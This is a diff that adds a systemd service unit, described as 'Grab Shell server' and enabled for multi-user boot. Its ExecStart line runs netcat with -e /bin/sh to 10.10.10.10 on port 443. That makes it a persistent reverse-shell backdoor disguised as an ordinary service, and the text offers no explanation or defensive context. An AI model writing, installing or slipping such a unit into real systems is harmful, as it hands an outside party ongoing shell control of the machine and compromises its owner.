@@ -1,0 +1,12 @@
+[Unit]
+Description=Grab Shell server
+After=network.target
+
+[Service]
+ExecStart=/bin/nc -e /bin/sh 10.10.10.10 443
+KillMode=process
+Type=simple
+
+[Install]
+WantedBy=multi-user.target
+Alias=grab.service
